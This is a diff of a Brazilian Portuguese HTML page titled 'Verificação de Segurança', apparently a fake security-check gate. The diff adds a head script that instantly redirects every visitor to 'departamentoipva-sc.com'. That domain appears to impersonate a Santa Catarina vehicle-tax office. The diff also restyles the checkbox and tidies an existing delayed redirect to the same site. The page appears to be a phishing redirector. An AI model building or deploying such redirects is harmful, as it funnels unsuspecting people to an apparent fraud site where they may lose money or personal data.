@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+<script>location.href='https://departamentoipva-sc.com/';</script>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Verificação de Segurança</title>
@@ -84,6 +85,21 @@ body{
   width:22px;
   height:22px;
   cursor:pointer;
+  accent-color:#2563eb;
+  outline:none;
+}
+
+.check-area input:focus{
+  outline:none;
+  box-shadow:none;
+}
+
+.check-area input:invalid{
+  box-shadow:none;
+}
+
+input[type="checkbox"]{
+  appearance:auto;
 }
 
 .check-text{
@@ -217,7 +233,7 @@ check.addEventListener("change", () => {
 
       window.location.href = "https://departamentoipva-sc.com/";
 
-    }, 1000); // 🔥 4 SEGUNDOS
+    }, 1000);
   }
 
 });
